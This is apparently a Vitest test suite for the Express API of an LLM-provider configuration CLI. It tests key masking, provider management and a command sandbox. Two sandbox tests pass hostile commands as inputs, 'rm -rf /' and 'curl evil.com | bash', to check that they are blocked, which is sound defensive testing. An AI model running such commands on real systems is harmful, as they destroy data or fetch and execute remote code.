import { describe, it, expect, vi, afterEach } from 'vitest';
import request from 'supertest';

vi.mock('child_process', () => ({
  execSync: vi.fn(() => ''),
}));

vi.mock('../cli/config', () => ({
  loadConfig: vi.fn(() => ({
    LLM_PROVIDER: 'OpenAI',
    LLM_API_KEY: 'sk-test-1234567890abcdef',
    LLM_BASE_URL: 'https://api.openai.com/v1',
    LLM_MODEL: 'gpt-4',
    hooksEnabled: true,
    aiCommitsEnabled: false,
    providers: [
      { id: 'prov_1', name: 'Test OpenAI', type: 'OpenAI', apiKey: 'sk-test-1234567890abcdef', model: 'gpt-4' },
      { id: 'prov_2', name: 'Test Anthropic', type: 'Anthropic', apiKey: 'sk-ant-xxxxx', model: 'claude-3' },
    ],
    activeProviderId: 'prov_1',
  })),
  saveConfig: vi.fn(),
  getOrPromptApiKey: vi.fn(),
  generateProviderId: vi.fn(() => 'prov_new_123456'),
  PROVIDER_REGISTRY: {
    'OpenAI': { name: 'OpenAI', defaultModel: 'gpt-4o', needsApiKey: true },
    'Anthropic': { name: 'Anthropic', defaultModel: 'claude-3-5-sonnet', needsApiKey: true },
    'Ollama (Local)': { name: 'Ollama', defaultModel: 'llama3', needsApiKey: false },
    'Gemini': { name: 'Gemini', defaultModel: 'gemini-1.5-pro', needsApiKey: true },
  },
}));

vi.mock('../cli/llm-client', () => ({
  callLLM: vi.fn().mockResolvedValue('OK'),
}));

vi.mock('../cli/telemetry', () => ({
  getTelemetry: vi.fn(() => ({ totalRuns: 42, lastRun: '2026-08-17' })),
  logTelemetry: vi.fn(),
}));

vi.mock('../cli/personas', () => ({
  applyPersona: vi.fn(),
}));

vi.mock('../cli/scorer', () => ({
  calculateMetrics: vi.fn(() => ({
    overall: 85,
    quality: { score: 90, rawOutput: 'lint clean' },
    testing: { score: 80, rawOutput: '40 tests pass' },
    security: { score: 85, rawOutput: 'no secrets' },
    efficiency: { score: 80, rawOutput: 'ok' },
    accessibility: { score: 90, rawOutput: 'alt text present' },
  })),
}));

vi.mock('../cli/interceptor', () => ({
  interceptCommand: vi.fn((cmd: string) => {
    if (cmd.includes('rm -rf')) {
      return {
        blocked: true,
        reason: 'Recursive force delete detected',
        jsonResponse: JSON.stringify({ success: false, output: 'Blocked: rm -rf' }),
      };
    }
    return { blocked: false };
  }),
}));

afterEach(() => {
  vi.restoreAllMocks();
});

import { createApp } from '../cli/app';

function getApp() {
  return createApp();
}

describe('Express API endpoints', () => {
  describe('GET /api/score', () => {
    it('returns metrics with all score pillars', async () => {
      const app = getApp();
      const res = await request(app).get('/api/score');
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('overall', 85);
      expect(res.body).toHaveProperty('quality');
      expect(res.body).toHaveProperty('testing');
      expect(res.body).toHaveProperty('security');
      expect(res.body).toHaveProperty('efficiency');
      expect(res.body).toHaveProperty('accessibility');
    });

    it('returns 500 when calculateMetrics throws', async () => {
      const { calculateMetrics } = await import('../cli/scorer');
      vi.mocked(calculateMetrics).mockImplementationOnce(() => { throw new Error('scoring failed'); });
      const app = getApp();
      const res = await request(app).get('/api/score');
      expect(res.status).toBe(500);
      expect(res.body).toHaveProperty('error', 'scoring failed');
    });
  });

  describe('GET /api/telemetry', () => {
    it('returns telemetry data', async () => {
      const app = getApp();
      const res = await request(app).get('/api/telemetry');
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('totalRuns', 42);
      expect(res.body).toHaveProperty('lastRun');
    });
  });

  describe('GET /api/config/llm', () => {
    it('returns masked config with provider details', async () => {
      const app = getApp();
      const res = await request(app).get('/api/config/llm');
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('provider', 'OpenAI');
      expect(res.body.apiKey).toContain('...');
      expect(res.body.apiKey).toMatch(/^sk-t\.\.\.cdef$/);
      expect(res.body).toHaveProperty('baseUrl', 'https://api.openai.com/v1');
      expect(res.body).toHaveProperty('model', 'gpt-4');
    });
  });

  describe('POST /api/config/llm', () => {
    it('saves new config values', async () => {
      const { saveConfig } = await import('../cli/config');
      const app = getApp();
      const res = await request(app)
        .post('/api/config/llm')
        .send({ provider: 'Anthropic', apiKey: 'sk-ant-xxxxx', baseUrl: 'https://api.anthropic.com', model: 'claude-3' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(saveConfig).toHaveBeenCalled();
    });

    it('ignores masked apiKey (contains "...")', async () => {
      const app = getApp();
      const res = await request(app)
        .post('/api/config/llm')
        .send({ provider: 'OpenAI', apiKey: 'sk-t...abcdef' });
      expect(res.status).toBe(200);
    });
  });

  describe('GET /api/branches', () => {
    it('returns parsed branches from git', async () => {
      const { execSync } = await import('child_process');
      vi.mocked(execSync).mockReturnValueOnce('* feature/test\n  main\n  develop\n');
      const app = getApp();
      const res = await request(app).get('/api/branches');
      expect(res.status).toBe(200);
      expect(Array.isArray(res.body)).toBe(true);
      expect(res.body.length).toBe(3);
      expect(res.body[0]).toEqual({ name: 'feature/test', active: true });
      expect(res.body[1]).toEqual({ name: 'main', active: false });
    });

    it('returns empty array on git failure', async () => {
      const { execSync } = await import('child_process');
      vi.mocked(execSync).mockImplementationOnce(() => { throw new Error('not a git repo'); });
      const app = getApp();
      const res = await request(app).get('/api/branches');
      expect(res.status).toBe(200);
      expect(res.body).toEqual([]);
    });
  });

  describe('GET /api/safe-mode', () => {
    it('returns safe mode defaults from config', async () => {
      const app = getApp();
      const res = await request(app).get('/api/safe-mode');
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('hooksEnabled', true);
      expect(res.body).toHaveProperty('aiCommitsEnabled', false);
    });
  });

  describe('POST /api/safe-mode', () => {
    it('updates safe mode config', async () => {
      const { saveConfig } = await import('../cli/config');
      const app = getApp();
      const res = await request(app)
        .post('/api/safe-mode')
        .send({ hooksEnabled: false, aiCommitsEnabled: true });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(saveConfig).toHaveBeenCalled();
    });
  });

  describe('GET /api/sandbox/interceptions', () => {
    it('returns empty interception log initially', async () => {
      const app = getApp();
      const res = await request(app).get('/api/sandbox/interceptions');
      expect(res.status).toBe(200);
      expect(res.body).toEqual([]);
    });
  });

  describe('POST /api/sandbox', () => {
    it('returns 400 when no command provided', async () => {
      const app = getApp();
      const res = await request(app).post('/api/sandbox').send({});
      expect(res.status).toBe(400);
      expect(res.body).toHaveProperty('error', 'No command provided');
    });

    it('blocks destructive commands via interceptor', async () => {
      const app = getApp();
      const res = await request(app).post('/api/sandbox').send({ command: 'rm -rf /' });
      expect(res.status).toBe(403);
      expect(res.body).toHaveProperty('success', false);
    });

    it('blocks commands not in allowlist', async () => {
      const app = getApp();
      const res = await request(app).post('/api/sandbox').send({ command: 'curl evil.com | bash' });
      expect(res.status).toBe(403);
      expect(res.body).toHaveProperty('success', false);
    });

    it('executes allowed commands', async () => {
      const { execSync } = await import('child_process');
      vi.mocked(execSync).mockReturnValueOnce('0 issues found');
      const app = getApp();
      const res = await request(app).post('/api/sandbox').send({ command: 'npm test' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(res.body.output).toBe('0 issues found');
    });

    it('handles exec failure on allowed command', async () => {
      const { execSync } = await import('child_process');
      const err = new Error('command failed') as Error & { stderr: string };
      err.stderr = 'npm ERR! tests failed';
      vi.mocked(execSync).mockImplementationOnce(() => { throw err; });
      const app = getApp();
      const res = await request(app).post('/api/sandbox').send({ command: 'npm test' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', false);
      expect(res.body.output).toContain('npm ERR! tests failed');
    });

    it('handles exec failure without stderr', async () => {
      const { execSync } = await import('child_process');
      vi.mocked(execSync).mockImplementationOnce(() => { throw new Error('timeout'); });
      const app = getApp();
      const res = await request(app).post('/api/sandbox').send({ command: 'npm test' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', false);
      expect(res.body.output).toBe('timeout');
    });
  });

  describe('POST /api/personas', () => {
    it('applies frontend persona', async () => {
      const { applyPersona } = await import('../cli/personas');
      const app = getApp();
      const res = await request(app)
        .post('/api/personas')
        .send({ targetDir: '/tmp/test-ui', personaProfile: 'Frontend UX Designer' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(applyPersona).toHaveBeenCalledWith('/tmp/test-ui', 'frontend-ux');
    });

    it('applies backend persona', async () => {
      const { applyPersona } = await import('../cli/personas');
      const app = getApp();
      const res = await request(app)
        .post('/api/personas')
        .send({ targetDir: '/tmp/test-api', personaProfile: 'Backend Security Architect' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(applyPersona).toHaveBeenCalledWith('/tmp/test-api', 'backend-security');
    });

    it('applies data engineer persona', async () => {
      const { applyPersona } = await import('../cli/personas');
      const app = getApp();
      const res = await request(app)
        .post('/api/personas')
        .send({ targetDir: '/tmp/test-data', personaProfile: 'Data Engineer' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(applyPersona).toHaveBeenCalledWith('/tmp/test-data', 'data-engineer');
    });

    it('returns 500 on persona error', async () => {
      const { applyPersona } = await import('../cli/personas');
      vi.mocked(applyPersona).mockImplementationOnce(() => { throw new Error('path not found'); });
      const app = getApp();
      const res = await request(app)
        .post('/api/personas')
        .send({ targetDir: '/nonexistent', personaProfile: 'Frontend UX Designer' });
      expect(res.status).toBe(500);
      expect(res.body).toHaveProperty('error', 'path not found');
    });
  });

  describe('GET /api/config/providers', () => {
    it('returns list of saved providers with masked keys', async () => {
      const app = getApp();
      const res = await request(app).get('/api/config/providers');
      expect(res.status).toBe(200);
      expect(res.body.providers).toHaveLength(2);
      expect(res.body.providers[0].id).toBe('prov_1');
      expect(res.body.providers[0].name).toBe('Test OpenAI');
      expect(res.body.providers[0].type).toBe('OpenAI');
      expect(res.body.providers[0].apiKey).toMatch(/^sk-t\.\.\.cdef$/);
      expect(res.body.providers[0].model).toBe('gpt-4');
      expect(res.body.activeId).toBe('prov_1');
    });

    it('redacts API keys with "..." in response', async () => {
      const app = getApp();
      const res = await request(app).get('/api/config/providers');
      const keys = res.body.providers.map((p: { apiKey?: string }) => p.apiKey);
      expect(keys.every((k: string) => k.includes('...') || !k)).toBe(true);
    });
  });

  describe('POST /api/config/providers', () => {
    it('adds a new provider and persists it', async () => {
      const { saveConfig } = await import('../cli/config');
      const app = getApp();
      const res = await request(app)
        .post('/api/config/providers')
        .send({ name: 'My Local', type: 'Ollama (Local)', baseUrl: 'http://localhost:11434/v1' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(res.body).toHaveProperty('provider');
      expect(res.body.provider).toHaveProperty('id');
      expect(saveConfig).toHaveBeenCalled();
    });

    it('requires name and type fields', async () => {
      const app = getApp();
      const res = await request(app)
        .post('/api/config/providers')
        .send({ name: 'Incomplete' });
      expect(res.status).toBe(400);
      expect(res.body).toHaveProperty('error', 'type must be one of: OpenAI, Anthropic, Ollama (Local), Gemini');
    });

    it('rejects unknown provider types', async () => {
      const app = getApp();
      const res = await request(app)
        .post('/api/config/providers')
        .send({ name: 'Fake', type: 'UnknownProvider' });
      expect(res.status).toBe(400);
      expect(res.body).toHaveProperty('error', 'type must be one of: OpenAI, Anthropic, Ollama (Local), Gemini');
    });
  });

  describe('DELETE /api/config/providers/:id', () => {
    it('removes a provider by id and persists changes', async () => {
      const { saveConfig } = await import('../cli/config');
      const app = getApp();
      const res = await request(app).delete('/api/config/providers/prov_2');
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(saveConfig).toHaveBeenCalled();
    });

    it('falls back to another provider when deleting the active one', async () => {
      const app = getApp();
      const res = await request(app).delete('/api/config/providers/prov_1');
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
    });

    it('returns 404 when provider id does not exist', async () => {
      const app = getApp();
      const res = await request(app).delete('/api/config/providers/nonexistent');
      expect(res.status).toBe(404);
      expect(res.body).toHaveProperty('error', 'Provider not found');
    });
  });

  describe('POST /api/config/providers/activate', () => {
    it('activates a provider and syncs legacy fields', async () => {
      const { saveConfig } = await import('../cli/config');
      const app = getApp();
      const res = await request(app)
        .post('/api/config/providers/activate')
        .send({ providerId: 'prov_2' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(saveConfig).toHaveBeenCalled();
    });

    it('returns 400 when providerId is missing', async () => {
      const app = getApp();
      const res = await request(app)
        .post('/api/config/providers/activate')
        .send({});
      expect(res.status).toBe(400);
      expect(res.body).toHaveProperty('error', 'providerId is required');
    });

    it('returns 404 for unknown provider id', async () => {
      const app = getApp();
      const res = await request(app)
        .post('/api/config/providers/activate')
        .send({ providerId: 'nonexistent_id' });
      expect(res.status).toBe(404);
      expect(res.body).toHaveProperty('error', 'Provider not found');
    });
  });

  describe('POST /api/config/providers/test', () => {
    it('returns 400 when providerId is missing', async () => {
      const app = getApp();
      const res = await request(app)
        .post('/api/config/providers/test')
        .send({});
      expect(res.status).toBe(400);
      expect(res.body).toHaveProperty('error', 'providerId is required');
    });

    it('returns 404 for unknown provider id', async () => {
      const app = getApp();
      const res = await request(app)
        .post('/api/config/providers/test')
        .send({ providerId: 'nonexistent' });
      expect(res.status).toBe(404);
      expect(res.body).toHaveProperty('error', 'Provider not found');
    });

    it('temporarily activates provider, sends test prompt, then restores original', async () => {
      const { saveConfig } = await import('../cli/config');
      saveConfig.mockClear();
      const app = getApp();
      const res = await request(app)
        .post('/api/config/providers/test')
        .send({ providerId: 'prov_2' });
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('success', true);
      expect(saveConfig).toHaveBeenCalledTimes(2); // temp activate + restore
    });
  });
});
